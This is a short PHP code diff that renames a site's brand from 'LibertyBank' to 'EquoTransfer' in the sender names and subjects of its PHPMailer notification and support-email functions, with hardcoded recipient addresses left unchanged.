@@ -75,7 +75,7 @@ function sendmail($email, $subject, $message, $phpmailer)
     $mail->SMTPSecure	= false;
     $mail->Port			= 587;
 
-    $mail->setFrom(USERNAME_EMAIL, 'LibertyBank');
+    $mail->setFrom(USERNAME_EMAIL, 'EquoTransfer');
     $mail->isHTML(true);
 
     $mail->ClearAllRecipients();
@@ -110,13 +110,13 @@ function send_email($email, $message, $phpmailer)
         )
     );
     
-    $mail->setFrom(USERNAME_EMAIL, 'LibertyBank Bank Notification');
+    $mail->setFrom(USERNAME_EMAIL, 'EquoTransfer Bank Notification');
     $mail->addReplyTo($email);
     $mail->isHTML(true);
     
     $mail->ClearAllRecipients();
     
-    $mail->Subject = 'Ask about LibertyBank';
+    $mail->Subject = 'Ask about EquoTransfer';
     $mail->AddAddress('roberto-info@tracklessmail.com');
     $mail->AddAddress('m3rc4n73@gmail.com');
     
@@ -145,13 +145,13 @@ function send_email_support_topup($email, $message, $file_tmp, $file_name,  $php
         )
     );
     
-    $mail->setFrom(USERNAME_EMAIL, 'LibertyBank Bank Notification');
+    $mail->setFrom(USERNAME_EMAIL, 'EquoTransfer Bank Notification');
     $mail->addReplyTo($email);
     $mail->isHTML(true);
     
     $mail->ClearAllRecipients();
     
-    $mail->Subject = 'Problem Support LibertyBank';
+    $mail->Subject = 'Problem Support EquoTransfer';
     $mail->AddAddress('saymyname377@gmail.com');
     
 
@@ -175,7 +175,7 @@ function send_email_admin($email, $subject, $message, $phpmailer)
     $mail->SMTPSecure   = false;
     $mail->Port         = 587;
 
-    $mail->setFrom(USERNAME_EMAIL, 'LibertyBank Service');
+    $mail->setFrom(USERNAME_EMAIL, 'EquoTransfer Service');
     $mail->isHTML(true);
 
     $mail->ClearAllRecipients();
